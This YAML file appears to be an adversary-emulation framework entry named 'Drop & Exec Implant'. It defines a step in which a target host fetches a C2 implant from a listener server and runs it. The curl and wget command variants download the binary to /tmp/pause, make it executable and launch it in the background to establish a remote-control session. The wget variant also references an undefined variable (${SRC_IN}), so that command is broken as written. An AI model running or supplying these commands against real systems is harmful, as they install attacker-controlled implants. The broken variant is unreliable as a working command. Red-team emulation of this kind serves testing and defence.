name: Drop & Exec Implant
description: Command to download a prepared C2 implant and execute it to establish a session
tactic: Execution
techniques: ["User Execution"]
args:
  SRC_BIN: "implant"
  DST_BIN: "/tmp/pause"
# command: "StartListener"
# effects: ["ListenerReady"]
cmdVariants:
  - key: curl
    command: curl -L ${LISTENER}:${FILESHARE_PORT}/${SRC_BIN} -o ${DST_BIN}  && chmod +x ${DST_BIN} && ${DST_BIN} &
  - key: wget
    command: wget ${LISTENER}:${FILESHARE_PORT}/${SRC_IN} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &
preconditions:
  accessLevel: "user-exec"
